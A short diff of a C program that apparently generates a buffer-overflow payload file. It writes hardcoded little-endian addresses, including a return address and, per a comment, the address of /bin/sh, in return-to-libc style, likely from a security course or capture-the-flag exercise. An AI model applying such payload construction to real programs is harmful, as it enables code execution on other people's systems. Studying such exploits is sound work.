@@ -95,8 +95,8 @@ int main(int argc, char *argv[]){
   //unsigned char * pTemp = littleEndian("0x1", 8);
   unsigned char* pTemp = littleEndian( "0x400550", 8 );
   //
-  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
-  fwrite(fpAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   //write return address
   fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   //write address of /bin/sh
